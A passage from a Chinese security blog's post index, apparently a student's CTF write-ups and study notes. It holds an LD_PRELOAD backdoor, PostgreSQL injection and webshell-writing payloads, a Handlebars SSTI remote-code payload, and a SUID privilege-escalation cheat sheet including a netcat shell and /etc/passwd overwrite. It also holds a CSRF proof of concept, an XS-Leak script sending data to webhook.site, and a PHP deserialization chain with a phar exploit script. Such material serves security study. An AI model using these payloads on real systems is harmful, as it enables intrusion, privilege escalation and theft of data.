LD_PRELOAD制作后门根据上面的知识，我们可以知道，通过LD_PRELOAD可以动态替换一些已经定义好的函数，但是有几个问题，我们从头捋一下，我们要后门执行命令，就说明需要调用一个进程，然后再去定点修改这个进程所调用的函数。 看了一下，都有一下函数可以使用 先以ls为例,首先查看 ls 这一系统命令会调用哪些库函数： readelf -Ws /usr/bin/ls 选择函数进行重写，但是不知道为啥这里查看不到，可能是版本问题吧 直接进行改写 #include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;#include &lt;string.h&gt;void payload() { system(&quot;id&quot;);}int strncmp(const char *__s1, const char *__s2, size_t __n) { // 这里函数的定义可以根据报错信息进行确定 if (getenv(&quot;LD_PRELOAD&quot;) == NULL) { return 0; } unsetenv(&quot;LD_PRELOAD&quot;); payload();} 此时替换成功 根据此思路 可以使用一些反弹shell的命令 实战总结一下要使用LD_PRELOAD实现rce需要以下几点 1.具有设置环境变量的权限2.可以启动新进程3.能够上传文件（.so） 但是要找到一个函数去替换是比较困难的，所以可以使用 C 语言扩展修饰符 __attribute__((constructor))，可以让由它修饰的函数在 main() 之前执行，若它出现在动态链接库中，那么一旦动态链接库被系统加载，将立即执行 __attribute__((constructor)) 修饰的函数。这样，我们就不用局限于仅劫持某一函数，而应考虑劫持动态链接库了，也可以说是劫持了一个新进程。 #include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;#include &lt;string.h&gt;__attribute__ ((__constructor__)) void preload (void){ unsetenv(&quot;LD_PRELOAD&quot;); system(&quot;id&quot;);} 蚁剑插件脚本 #define _GNU_SOURCE#include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;#include &lt;string.h&gt;extern char** environ;__attribute__ ((__constructor__)) void preload (void){ // get command line options and arg const char* cmdline = getenv(&quot;EVIL_CMDLINE&quot;); // unset environment variable LD_PRELOAD. // unsetenv(&quot;LD_PRELOAD&quot;) no effect on some // distribution (e.g., centos), I need crafty trick. int i; for (i = 0; environ[i]; ++i) { if (strstr(environ[i], &quot;LD_PRELOAD&quot;)) { environ[i][0] = '\\0'; } } // executive command system(cmdline);} 一点思考其实要想利用这个环境变量，最关键的还是要找到能够自启动的进程。 https://whoamianony.top/2021/10/22/Web%E5%AE%89%E5%85%A8/%E6%9C%89%E8%B6%A3%E7%9A%84%20LD_PRELOAD/","link":"/2022/02/08/LD-PRELOAD%E5%AD%A6%E4%B9%A0/"},{"title":"java初探（一）","text":"对java进行远程调试对jar包进行远程调试1.创建一个java项目，并创建一个lib文件夹将jar包放入2.进入lib文件夹后，右键选择 Add as Library3.选择右上角的Add Configurations，并单击+号添加remote，其中 -agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=5005 对weblogic进行远程调试maven基础知识掌握Maven是一个项目构建工具，采用Project Object Model概念来管理项目。 1.pom.xml文件介绍该文件使用xml文件结构，用于管理源代码，配置文件，开发者的信息和角色，问题追踪系统，组织者信息，项目授权，项目的url，项目的依赖关系等。 maven项目中必须包含pom.xml文件。 2.pom.xml定义依赖关系pom.xml文件中的dependencies和dependency用于定义依赖关系， dependency通过groupId、artifactId、version来定义所依赖的项目。引入fastjson1.2.24版本组件的Maven配置信息 debugFlag=”true”export debugFlag","link":"/2022/02/20/java%E5%88%9D%E6%8E%A2%EF%BC%88%E4%B8%80%EF%BC%89/"},{"title":"java初探（二）","text":"tomcat写完的程序放在webapps 如何创建一个java web工程servletjava servlet 是运行在web服务器或应用服务器上的程序，它是作为来自web浏览器或其他HTTP客户端的请求和HTTP服务器上的数据库或应用程序之间的中间层 功能1.创建并返回基于客户请求的动态HTML页面2.与数据库进行通信 如何制作映射 让客户端访问到java类web.xml中，Servlet的配置在servlet标签中，有servlet和servlet-mapping标签组成，通过servlet-name实现 &lt;servlet&gt;:声明servlet配置入口&lt;description&gt;:声明servlet描述信息&lt;display-name&gt;:定义web应用名字&lt;servlet-name&gt;:声明servlet名称以便在后面的映射时使用&lt;servlet-class&gt;:指定当前servlet对应的类的路径&lt;servlet-mapping&gt;:注册组件访问配置的路径入口&lt;servlet-name&gt;:指定上文配置的servlet的名称&lt;url-pattern&gt;:指定配置这个组件的访问路径 例: &lt;servlet&gt; &lt;servlet-name&gt;myservlet(java包名字)&lt;/servlet-name&gt; &lt;servlet-class&gt;路径&lt;/servlet-class&gt;&lt;servlet-mapping&gt; &lt;servlet-name&gt;myservlet&lt;/servlet-name&gt; &lt;url-pattern&gt;声明浏览器访问的路径&lt;/url-pattern&gt;&lt;servlet-mapping&gt; 而在Servlet3.0以上的版本中，web.xml可以配置的servlet属性，都可以通过@WebServlet的方式进行配置 接口方法init():初始化对象service():执行实际任务的主要方法doget()/dopost()destory()接口：释放资源 java web过滤器——filterfilter是Servlet2.3新增的一个特性，能够实现对所有web资源的管理，实现权限访问控制，过滤敏感词汇，压缩响应信息等一些高级功能 配置方式:1.基于web.xml 2.基于注解方式 注意：使用注解方式配置filter，无法确定过滤器的执行顺序 filter实现流程用户向服务器发送request请求，服务器接收改请求，并将请求按次序发送到filter中进行处理，最后调用servlet中的service()方法，调用完毕后，按照与进入时相反的顺序调用filter返回给服务器，最终返回给用户。","link":"/2022/02/21/java%E5%88%9D%E6%8E%A2%EF%BC%88%E4%BA%8C%EF%BC%89/"},{"title":"nodejs-express开发","text":"1.全局安装express框架,cmd打开命令行,输入如下命令: npm install -g express express 4.x版本中将命令工具分出来,安装一个命令工具,执行命令: npm install -g express-generator 输入express --version验证 2.如果在执行js文件仍报Error: Cannot find module express错误。 解决办法： 在自己的工程目录下再次执行: npm install express————————————————版权声明：本文为CSDN博主「mlsama」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。原文链接：https://blog.csdn.net/mlsama/article/details/80211033","link":"/2022/02/07/nodejs-express%E5%BC%80%E5%8F%91/"},{"title":"postgresql注入","text":"前言总结一下一些注入姿势 基础语法1.Postgres 都是大小写不敏感的 \\h #查看所有的sql关键字\\? #命令行操作的帮助\\d #查看当前schema 中所有的表\\q #退出pg命令行\\d #schema.table 查看表的结构\\x #横纵显示切换\\dT+ #显示扩展类型相关属性及描述\\l #列出所有的数据库\\timing #显示执行时间\\c database_name #切换数据库set search to schema #切换schemaexplain sql #解释或分析sql执行过程 数据库之间的语言基本都是通用的，查询的时候重点关注的还是一些库的不同，例如current_database(),像like这些也是通用的s 注入点测试以及注入方法postgresql的注入点可能会位于不同字句内 select如果参数是整数：pg_sleep(20); -- -如果参数是字符串：'||pg_sleep(20); -- - 注入方法： 1' UNION SELECT 'a';-- -' union'||password FROM users; -- -'; 我们知道一般回显的是第一列，所以只需要让第一列不存在就行了 from测试语句: 数字:(SELECT * FROM [TABLE] WHERE [COLUMN]=1|(SELECT (SELECT CASE WHEN COUNT((SELECT pg_sleep(20)))&lt;&gt;0 THEN 1 ELSE 2 END))) ss; -- -字符串：(SELECT * FROM [TABLE] WHERE [COLUMN] = 'asd'::varchar||(SELECT (SELECT CASE WHEN COUNT((SELECT pg_sleep(20)))&lt;&gt;0 THEN 1 ELSE 2 END))) ss; -- - 注入语句为 (SELECT * FROM address WHERE address=''||(SELECT CASE WHEN (SELECT COUNT((SELECT username FROM staff WHERE username SIMILAR TO 'M%')))&lt;&gt;0 THEN pg_sleep(20) ELSE '' END)) ss; -- -; 最终效果为： SELECT address FROM (SELECT * FROM address WHERE address=''||(SELECT CASE WHEN (SELECT COUNT((SELECT username FROM staff WHERE username SIMILAR TO 'M%')))&lt;&gt;0 THEN pg_sleep(20) ELSE '' END)) ss; -- -; 根据SELECT username FROM staff WHERE username SIMILAR TO 'M%'返回的内容与否，它会休眠20秒，或者什么也不做。可以逐字节fuzz数据。 order by注入点测试：是否延时 (SELECT CASE WHEN COUNT((SELECT pg_sleep(20)))&lt;&gt;0 THEN true ELSE false END); -- - 利用order by的true或者false (SELECT CASE WHEN COUNT((SELECT (SELECT CASE WHEN COUNT((SELECT username FROM staff WHERE username SIMILAR TO 'M%'))&lt;&gt;0 THEN pg_sleep(20) ELSE '' END)))&lt;&gt;0 THEN true ELSE false END); -- - 如果第一个COUNT函数没有返回零，那么对于ORDER BY，我们得到最终的true或false。 正确或错误取决于内部选择(第二个查询是核心判断的)。 内部选择将休眠20秒，或者什么也不返回。 这取决于人员表中用户的首字母是否以M开头（这是SELECT username FROM staff WHERE username SIMILAR TO 'M%'部分）。 HAVING注入点测试 如果parameter是整数：(COUNT((SELECT pg_sleep(20)))=1); -- -如果parameter是字符串：t' AND (SELECT COUNT((SELECT pg_sleep(20)))) = 1; -- - 此参数接受一个条件，因此我添加了一个AND运算符以使之必须都为真，然后添加了条件，该条件将使我们可以逐字节对值进行暴力破解。 t' AND (SELECT COUNT((SELECT password FROM staff WHERE password SIMILAR TO '8%' LIMIT 1))) = 1; -- - 同样，如果未显示输出，则可以使pg_sleep（）函数的大部分时间睡眠（如果为true）20秒钟，并使用它来确定条件输出。 内置函数current_database() //当前数据库名session_user //会话用户current_user //当前数据库用户user //当前用户version() //数据库版本 注入过程爆库 and 1=2 union select (select current_database()),null,null-- 获取表名，字段名 and 1=2 union select table_name,null,null from information_schema.tables limit 1 offset n--and 1=2 union select column_name,null,null from information_schema.columns where table_name='admin' limit 1 offset n--(老版本)pg_class.oid对应pg_attribute.attrelidpg_class.relname表名pg_attribute.attname字段名select relname from pg_class获取表名select oid from pg_class wehre relname='admin'获取表的oidselect attname from pg_attribute where attrelid='oid的值' 获取字段名 获取数据 nd 1=2 union select username||chr(124)||passwd,null,null from pg_shadow limit 1 offset 0--爆数据库用户密码 读写文件老版本写文件:create table beach(shell text)insert into beach values('&lt;?php eval($_POST[c])?&gt;')copy beach(shell) to '/var/www/html/shell.php'drop table beach#PS:copy (select '&lt;?php eval($_POST[c])?&gt;') to '/var/www/html/shell.php'老版本读文件:create table beach(shell text)copy beach(shell) from '/etc/passwd'select * from beach limit 1 offset n读每一行实战:登入后:sql&gt;select '&lt;%execute request(&quot;v&quot;)%&gt;';sql&gt;\\o c:\\\\wwwroot\\\\1.aspURL执行:id=1;copy (select '&lt;?php eval($_POST[c])?&gt;') to '/var/www/html/shell.php'新版本:pg_file_write(filename,text,bool)pg_read_file(filename,pos,length)pg_ls_dir(dirname)绕过转义: GPC=On时候 用$quote$代替单引号如:select pwd from admin wehre user='beach'成:select pwd from admin where user=$x$beach$x$ 绕过/**/ = &quot; &quot;;-- - 忽略尾随数据 过滤引号使用$符号 select $$test$$ == SELECT $quote$test$quote$; == select 'test' 在字符串拼接的时候采取CHR()函数: SELECT CHR(65)||CHR(66)||CHR(67)||CHR(68)||CHR(69)||CHR(70)||CHR(71)||CHR(72);等效于SELECT 'ABCDEFGH'; 命令执行1.利用 libc 中的 system() 函数2.利用Perl/Python脚本语言功能3.利用C语言自定义函数查看Postgresql目录 SELECT setting FROM pg_settings WHERE name='data_directory'; 查询oid select lo_creat(-1); oid与上面保持一致; delete from pg_largeobject where loid=18412; 把十六进制的so文件导入 insert into pg_largeobject (loid,pageno,data) values(18412, 0, decode('7F454CXXXXXXXXX000', 'hex')); //这里略写了十六进制so文件的完整内容 利用postgresql自带函数将大型对象导出到文件 SELECT lo_export(18412, 'cmd.so'); 建立UDF CREATE OR REPLACE FUNCTION sys_eval(text) RETURNS text AS '/xxx/cmd.so', 'sys_eval' LANGUAGE C RETURNS NULL ON NULL INPUT IMMUTABLE; 调用udf select sys_eval('id');","link":"/2022/02/07/postgresql%E6%B3%A8%E5%85%A5/"},{"title":"使用docker出题","text":"","link":"/2022/02/10/%E4%BD%BF%E7%94%A8docker%E5%87%BA%E9%A2%98/"},{"title":"区块链理论学习","text":"数据链和节点链数据链指用链式结构组织区块数据，构成数据校验和追溯的链条；“节点链”指多个节点通过网络连接在一起，互相共享信息，其中的共识节点则联合执行共识算法，产生并确认区块。 针对溯源机制来说，生产商，运输商就相当于节点链，而需要上链的数据则是针对数据链而言，并且数据上链即为交易上链 交易“上链”的简要过程如下： 记账者们收录交易，按链式数据结构打包成“区块”。 共识算法驱动大家验证新区块里的交易，确保计算出一致的结果。 数据被广播到所有节点，稳妥存储下来，每个节点都会存储一个完整的数据副本。 共识机制“共识机制”，是通过特殊节点的投票，在很短的时间内完成对交易的验证和确认；对一笔交易，如果利益不相干的若干个节点能够达成共识，我们就可以认为全网对此也能够达成共识。 智能合约智能合约是一种特殊协议，旨在提供、验证及执行合约。具体来说，智能合约是区块链被称之为“去中心化的”重要原因，它允许我们在不需要第三方的情况下，执行可追溯、不可逆转和安全的交易。 智能合约是执行“如果发生这种情况就执行那种结果”的小程序，由大量计算机运行并验证以确保可信。","link":"/2022/02/13/%E5%8C%BA%E5%9D%97%E9%93%BE%E7%90%86%E8%AE%BA%E5%AD%A6%E4%B9%A0/"},{"title":"2021东华杯","text":"前言比赛那天体侧==人傻了，后面也没心情做，但是感觉比赛的题都是可以学习的，可惜没想到环境马上就关了– apacheprOxy附近是一个docker文件，发现是GKCTF2021的原题（简化版）,这里主要学习一下学长的工具试试看 首先使用扫描器扫描链接 python3 ws.py -t xx.xx.xx.xx 然后使用工具一键getshell python cve-2020-14882_rce.py -u http://127.0.0.1:7001 -c whoami eznode看看能不能本地起一个跑一下看看配置过程，首先出现了第一个问题: 'const' is available in ES6 (use 'esversion: 6') or Mozilla JS extensions (use moz). (W104) 查到解决方法是:在开头添加一个 /*jshint esversion: 6 */ 然后一直说找不到module，install了很多次，发现需要cd到那个项目目录下去install这些模块 npm install 由于前面的登录部分需要麻烦的数据库之类的配置，所以我就直接进入到upload的路由，并删除校验的部分了查看package.json，一个一个查漏洞（积累下） { &quot;name&quot;: &quot;app&quot;, &quot;version&quot;: &quot;0.0.0&quot;, &quot;private&quot;: true, &quot;scripts&quot;: { &quot;start&quot;: &quot;node ./bin/www&quot;, &quot;dev&quot;: &quot;nodemon index.js -e js&quot; }, &quot;dependencies&quot;: { &quot;cookie-parser&quot;: &quot;~1.4.4&quot;, &quot;crypto&quot;: &quot;^1.0.1&quot;, &quot;debug&quot;: &quot;~2.6.9&quot;, &quot;express&quot;: &quot;~4.16.1&quot;, &quot;hbs&quot;: &quot;^4.0.1&quot;, &quot;http-errors&quot;: &quot;~1.6.3&quot;, &quot;morgan&quot;: &quot;~1.9.1&quot;, &quot;multer&quot;: &quot;^1.4.3&quot;, &quot;mysql&quot;: &quot;^2.18.1&quot;, &quot;path&quot;: &quot;^0.12.7&quot;, &quot;sequelize&quot;: &quot;^6.7.0&quot; }} 发现hbs的模板渲染有一个CVE-2021-32822参考文章:https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#handlebars-nodejs {{#with &quot;s&quot; as |string|}} {{#with &quot;e&quot;}} {{#with split as |conslist|}} {{this.pop}} {{this.push (lookup string.sub &quot;constructor&quot;)}} {{this.pop}} {{#with string.split as |codelist|}} {{this.pop}} {{this.push &quot;return require('child_process').exec('whoami');&quot;}} {{this.pop}} {{#each conslist}} {{#with (string.sub.apply 0 codelist)}} {{this}} {{/with}} {{/each}} {{/with}} {{/with}} {{/with}}{{/with}} {{#with &quot;s&quot; as |string|}} {{#with &quot;e&quot;}} {{#with split as |conslist|}} {{this.pop}} {{this.push (lookup string.sub &quot;constructor&quot;)}} {{this.pop}} {{#with string.split as |codelist|}} {{this.pop}} {{this.push &quot;return process.mainModule.require('child_process').execSync('cat /flag').toString();&quot;}} {{this.pop}} {{#each conslist}} {{#with (string.sub.apply 0 codelist)}} {{this}} {{/with}} {{/each}} {{/with}} {{/with}} {{/with}}{{/with}} OldLibrary这里就记录一下 Linux SUID 提权关于suidsuid是赋予文件的一种权限具体叙述可以参考:https://www.cnblogs.com/sparkdev/p/9651622.html总结来说就是:当一个二进制可执行文件具有suid权限时，尽管不是root用户也可以执行本该root用户才能执行的功能 查找suid权限位文件下命令可以找到正在系统上运行的所有SUID可执行文件。准确的说，这个命令将从/目录中查找具有SUID权限位且属主为root的文件并输出它们，然后将所有错误重定向到/dev/null，从而仅列出该用户具有访问权限的那些二进制文件。 find / -user root -perm -4000 -print 2&gt;/dev/nullfind / -perm -u=s -type f 2&gt;/dev/nullfind / -user root -perm -4000 -exec ls -ldb {} ; 也可以使用 sudo -l 命令列出当前用户可执行的命令 常用提权方式nmap（2.02-5.21）存在交换模式，可利用提权 nmap --interactive 之后执行: nmap&gt; !shsh-3.2# whoamiroot msf中的模块为： exploit/unix/local/setuid_nmap 较新版可使用 --script 参数： echo &quot;os.execute('/bin/sh')&quot; &gt; /tmp/shell.nse &amp;&amp; sudo nmap --script=/tmp/shell.nse findtouch testfind test -exec whoami \\; nc 反弹 shell： find test -exec netcat -lvp 5555 -e /bin/sh \\; 2.3 vi/vim打开vim,按下ESC :set shell=/bin/sh:shell 或者 sudo vim -c '!sh' 2.4 bashbash -pbash-3.2# iduid=1002(service) gid=1002(service) euid=0(root) groups=1002(service) 2.5 lessless /etc/passwd!/bin/sh 2.6 moremore /home/pelle/myfile!/bin/bash 2.7 cp覆盖 /etc/shadow 或 /etc/passwd [zabbix@localhost ~]$ cat /etc/passwd &gt;passwd2.[zabbix@localhost ~]$ openssl passwd -1 -salt hack hack1233.$1$hack$WTn0dk2QjNeKfl.DHOUue04.[zabbix@localhost ~]$ echo 'hack:$1$hack$WTn0dk2QjNeKfl.DHOUue0:0:0::/root/:/bin/bash' &gt;&gt; passwd5.[zabbix@localhost ~]$ cp passwd /etc/passwd6.[zabbix@localhost ~]$ su - hack7.Password:8.[root@361way ~]# id9.uid=0(hack) gid=0(root) groups=0(root)10.[root@361way ~]# cat /etc/passwd|tail -111.hack:$1$hack$WTn0dk2QjNeKfl.DHOUue0:0:0::/root/:/bin/bash 2.8 mv覆盖 /etc/shadow 或 /etc/passwd 2.9 nanonano /etc/passwd 2.10 awkawk 'BEGIN {system(&quot;/bin/sh&quot;)}' 2.11 manman passwd!/bin/bash 2.12 wgetwget http://192.168.56.1:8080/passwd -O /etc/passwd 2.13 apache仅可查看文件，不能弹 shell： apache2 -f /etc/shadow 2.14 tcpdumpecho $'id\\ncat /etc/shadow' &gt; /tmp/.testchmod +x /tmp/.testsudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root 2.15 python/perl/ruby/lua/php/etcpython python -c &quot;import os;os.system('/bin/bash')&quot; perl exec &quot;/bin/bash&quot;; 就测试了一下vi的，发现还挺神奇的 原作者用得是 find / -perm -u=s -type f 2&gt;/dev/null #查找系统上运行的所有SUID可执行文件comm /flagggisshere /dev/null 2&gt; /dev/null 参考：http://www.snowywar.top/?p=2743","link":"/2021/11/01/2021%E4%B8%9C%E5%8D%8E%E6%9D%AF-suid%E6%8F%90%E6%9D%83/"},{"title":"2021安洵杯","text":"","link":"/2022/03/03/2021%E5%AE%89%E6%B4%B5%E6%9D%AF-1/"},{"title":"2022SUSCTF","text":"fxxkcorsCSRF题目，但是之前没做过，学习一下，大概思路就是通过让robots访问这个表单，然后就可以提升权限 &lt;html&gt; &lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt; &lt;body&gt; &lt;script&gt;history.pushState('', '', '/')&lt;/script&gt; &lt;form action=&quot;http://124.71.205.122:10002/changeapi.php&quot; method=&quot;POST&quot; enctype=&quot;text/plain&quot;&gt; &lt;input type=&quot;hidden&quot; name='{&quot;username&quot;:&quot;skr&quot;,&quot;test&quot;:&quot;' value='&quot;}' /&gt; &lt;input type=&quot;submit&quot; value=&quot;Submit request&quot; /&gt; &lt;/form&gt; &lt;script&gt; document.forms[0].submit(); &lt;/script&gt; &lt;/body&gt;&lt;/html&gt; ez_note跳转类型 XS-Leaks https://xsleaks.dev/docs/attacks/navigations/ &lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;utf-8&quot;&gt; &lt;meta name=&quot;robots&quot; content=&quot;noindex&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;ie=edge&quot;&gt;&lt;/head&gt;&lt;body&gt; &lt;script&gt; var flag = 'SUSCTF{' function send(msg) { fetch('https://webhook.site/bad84752-95a1-45c4-8395-e5577ea1112b?msg=' + encodeURIComponent(msg)) } function trying(keyword) { return new Promise(resolve =&gt; { var win = window.open('http://123.60.29.171:10001/search?q=' + keyword) setTimeout(() =&gt; { win.location = 'http://e050-220-133-126-220.ngrok.io/non.html' setTimeout(() =&gt; { if (win.history.length === 3) { send('success:' + keyword) } else { //send('fail:' + keyword) } win.close(); }, 1000) }, 1500) }) } async function run() { send('start') // }abcdefghijklmnopqrstuvwxyz0123456789_ // }abcdefghijklmnopqrs // let chars = '_abcdefghijklmnopqrstuv'.split('') //let chars = '}wxyz0123456789_'.split('') for(let char of chars) { const temp = flag + char trying(temp) } } setTimeout(() =&gt; { run() }, 1000) &lt;/script&gt;&lt;/body&gt;&lt;/html&gt; HTML practice使用##可以让页面空白——&gt;mako框架， 可以使用下面语句执行命令，但是无回显结果，不过可以存到其他文件夹里，使用文件重定向符号 % for a in (self.module.cache.util.os.system(name),2,3): 1% endfor","link":"/2022/03/03/2022SUSCTF/"},{"title":"2022TQLctf","text":"sql_test看到这题有挖掘利用链的操作，学一下，感觉自己针对框架的链子挖掘还是很陌生 这是一个symphony的目录，所以先认识一下这个框架，了解项目之间的文件关系 config/:包含配置文件src/:所有的php源代码templates/:Twig模板文件bin/：这里面主要是使用console文件,进行执行相关symfony命令var/：主要是包含:缓存文件和日志文件vendor/：第三方库文件public/：web网站根目录，如果使用apache、nginx这样的web服务器，需要把根目录指向这个目录 首先是挖掘链子，挖掘利用链，肯定是先找合适的destruct，但是翻了一下，发现destruct很多都有wake_up方法，所以转换思路，从其他魔术方法入手，先看看call方法,发现了两个可以进行命令执行的点，很明显，下面那个利用起来会更方便一些 public function __call($method, $args) { if (preg_match('/(.*)(Debug|Info|Notice|Warning|Error|Critical|Alert|Emergency)(.*)/', $method, $matches) &gt; 0) { $genericMethod = $matches[1] . ('Records' !== $matches[3] ? 'Record' : '') . $matches[3]; $level = strtolower($matches[2]); if (method_exists($this, $genericMethod)) { $args[] = $level; return call_user_func_array([$this, $genericMethod], $args); } } throw new \\BadMethodCallException('Call to undefined method ' . get_class($this) . '::' . $method . '()'); } 在这里，可以调用任意类的invoke()函数，所以我们去看看有没有适合的 namespace Symfony\\Component\\Cache\\Traits; public function __call(string $method, array $args){ $this-&gt;redis ?: $this-&gt;redis = $this-&gt;initializer-&gt;__invoke(); return $this-&gt;redis-&gt;{$method}(...$args);} 可以发现，在这里存在一个动态调用 namespace Symfony\\Component\\Console\\Helper; public function __invoke($var): string { return ($this-&gt;handler)($var); }} 接下来我们只需要寻找一下能传入两个参数，并且拥有$xxx-&gt;xxx()的类即可 可以看到这里的destruct执行的commit函数有我们需要的 public function __destruct(){ $this-&gt;commit();} 通过执行$item-&gt;getExpiry即可 public function commit(): bool { if (! $this-&gt;deferredItems) { return true; } $now = microtime(true); $itemsCount = 0; $byLifetime = []; $expiredKeys = []; foreach ($this-&gt;deferredItems as $key =&gt; $item) { $lifetime = ($item-&gt;getExpiry() ?? $now) - $now; 接下来我们组装一下 &lt;?phpnamespace Doctrine\\Common\\Cache\\Psr6{class CacheAdapter{ private $deferredItems; public function __construct() { $this-&gt;deferredItems =array(new \\Symfony\\Component\\Cache\\Traits\\RedisProxy()); }}}namespace Symfony\\Component\\Cache\\Traits { class RedisProxy { private $redis; private $initializer; private $ready = false; public function __construct() { $this-&gt;redis = &quot;id&quot;; $this-&gt;initializer = new \\Symfony\\Component\\Console\\Helper\\Dumper(); } }}namespace Symfony\\Component\\Console\\Helper { class Dumper { private $handler; public function __construct() { $this-&gt;handler = &quot;system&quot;; } }}namespace { $a = new Doctrine\\Common\\Cache\\Psr6\\CacheAdapter(); echo base64_encode(serialize($a));} 然后在本地测试一下就可以跑通了，接下来寻找一下反序列化点，可以看到没有unserialize，那一般就是phar反序列化了，需要寻找一下反序列化点。 本地测试了一下，成功触发： 可以看到这里有个注入点,其中key和value可控，查询手册可知，key为选择操作的参数 MYSQLI_INIT_COMMAND - 成功建立 MySQL 连接之后要执行的 SQL 语句 通过使用这个操作，可以执行value的内容 public function index(Request $request): Response{ $con = mysqli_init(); $key = $request-&gt;query-&gt;get('key'); $value = $request-&gt;query-&gt;get('value'); if (is_numeric($key) &amp;&amp; is_string($value)) { mysqli_options($con, $key, $value); } 二分法盲注，我们前面知道，需要找到文件上传点，而这里有个注入点，所以先看看有没有写入权限 爆破出可写入目录 /tmp/ce4d60d5da0336986edff5e01d97cC3e/ 所以执行sql语句进行写入，wp中写到mysqli_server_public_key这个选项设计到文件操作，是指定服务端公钥的路径。 因为caching_sha2_password认证方式下服务器端会使用缓存，如果不指定公钥连接就是向服务器请求key，所以一旦请求一次成功连接会保留着缓存，导致不会去加载我们指定的公钥。在这里可以通过执行FLUSH PRIVILEGES的命令或者修改用户密码，导致连接失败，同样会触发加载公钥的操作 完整的payload如下： 但是本地起了docker以后跑失败了。。。可能是环境原因吧，毕竟用了出题人的exp跑了也不行，但是我觉得还是应该尝试一下这个mysql的 import requestsimport timeimport randomimport stringimport osimport binasciis=requests.session()url=&quot;http://110.42.133.120:7001&quot;def req(key, value): resp = requests.get(url + &quot;/index.php/test&quot;, params={'key': key, 'value': value}) return respdef get_secure_file_path(): file_path = &quot;&quot; for i in range(1,10000): low =0 high=264 mid=(low+high)//2 while(low&lt;high): payload = f&quot;select if (ascii(substr((select @@global.secure_file_priv),{i},1))&gt;{mid},sleep(5),1);&quot; #print(payload) fi_time=time.time() s.get(url+payload) if time.time()-fi_time&gt;4: low = mid+1 else: high=mid mid=(low+high)//2 if(mid==0 or mid==264): break file_path +=chr(mid) return file_pathdef exp(file_path): filename=&quot;&quot;.join(random.sample(string.ascii_letters,6))+'.phar' file=os.path.join(file_path,filename) hex_data=str(binascii.b2a_hex(open('test.phar','rb').read())).replace(&quot;b'&quot;,&quot;&quot;).replace(&quot;'&quot;,&quot;&quot;) print(hex_data) command=f&quot;select 0x{hex_data} into dumpfile '{file}'&quot; print(command) req('3',command) command=f&quot;select if((ISNULL(load_file('{file}'))),sleep(2),1);&quot; if req('3', command).elapsed.seconds &gt; 1.5: print(&quot;file write fail!&quot;) exit() req('3',&quot;FLUSH PRIVILEGES;&quot;) time.sleep(5) print(file) resp = req('35', 'phar://' + file) print(resp.text)if __name__=='__main__': #file_path=get_secure_file_path() file_path=&quot;/tmp/ce4d60d5da0336986edff5e01d97c73e/&quot; print(file_path) exp(file_path) echo加上要用的功能点名称就能输出value了 还有一点需要注意的是，python输出的时候会自带一个b’符号要将他置换为空，不然影响写入结果","link":"/2022/02/26/2022TQLctf-0/"},{"title":"2022UTCTF","text":"HTMLPDF题目都还看到就被师傅们做出来了 通过使用 &lt;b&gt;Try Me!&lt;/b&gt;&lt;iframe src=&quot;/proc/self/cwd/app.py&quot; height=&quot;1600px&quot; width=&quot;800px&quot;&gt; 可以读到源码 from flask import *import pdfkitimport subprocessimport timeimport osimport spwdimport cryptfrom hmac import compare_digest as compare_hashapp = Flask(__name__)@app.route('/', methods=['POST','GET'])def index(): if request.method == 'POST': html_content = request.form.get('content') if html_content is None: return render_template('index.html') if '/environ' in html_content: # Don't let them read the flag from /proc/&lt;pid&gt;/environ return 'Aren''t you sneaky? That''s a good idea, but not the intended solution, so keep trying :)' # Filenames. html = render_template('document.html', content=html_content) uid = str(hash(time.time())) # Using a hash of the time ensures unique filenames between requests. out_filename = uid+'.pdf' html_filename = uid+'.html' html_file = open(html_filename, 'w') html_file.write(html) html_file.close() # Generate PDF. TIMEOUT = '3' subprocess.run(['xvfb-run', 'timeout', '--preserve-status', '-k', TIMEOUT, TIMEOUT, 'wkhtmltopdf','--enable-local-file-access', html_filename, out_filename]) # Cleanup and return result. out_file = open(out_filename, 'rb') output = out_file.read() out_file.close() #os.remove(out_filename) #os.remove(html_filename) response = make_response(output) response.headers['Content-Type'] = 'application/pdf' response.headers['Content-Disposition'] = 'inline; filename=document.pdf' return response return render_template('index.html')@app.route('/admin', methods=['POST','GET'])def adminLogin(): if request.method == 'POST': username = request.form.get('username') password = request.form.get('password') if username is None or password is None: return render_template('login.html') # Check that username and password match a user in the system. try: pw1 = spwd.getspnam(username).sp_pwd pw2 = crypt.crypt(password, pw1) if compare_hash(pw2, pw1): return render_template('login.html', msg=os.environ['FLAG']) else: return render_template('login.html', msg='Incorrect password!') except KeyError: # No such username. return render_template('login.html', msg='Incorrect username!') return render_template('login.html')if __name__ == '__main__': app.run(host='0.0.0.0') 存在同源策略，因此不允许直接跨目录实现文件读取，只能读取web目录下的，绕过方法: &lt;script&gt;x=new XMLHttpRequest;x.onload=function(){document.write(this.responseText)};x.open(&quot;GET&quot;,&quot;file:///etc/passwd&quot;);x.send();&lt;/script&gt; 拿到密码以后，发现使用弱密码加密，使用john爆破密码 john test_passwd websocket抓包抓不到东西，看起来是要用socket去连接，然后爆破密码吧 import asyncioimport websocketsasync def hello(): with open(&quot;test_pa.txt&quot;,&quot;r&quot;) as f: paswd=f.readlines() for i in paswd: uri = &quot;ws://web1.utctf.live:8651/internal/ws&quot; async with websockets.connect(uri) as websocket: await websocket.send('begin') result = await websocket.recv() #print(result) await websocket.send('user admin') await websocket.send('pass '+i.replace(&quot;\\n&quot;,&quot;&quot;)) result = await websocket.recv() print(result) print(f'pass {i}'.replace(&quot;\\n&quot;,&quot;&quot;)) if result!= &quot;badpass&quot;: print(i) breakasyncio.get_event_loop().run_until_complete(hello())","link":"/2022/03/12/2022UTCTF/"},{"title":"2022tqlCTF","text":"","link":"/2022/02/23/2022tqlCTF/"},{"title":"buu刷题","text":"[CISCN2019 华东南赛区]Web4一开始以为是ssrf，发现使用local_file://可以读取文件 # encoding:utf-8import re, random, uuid, 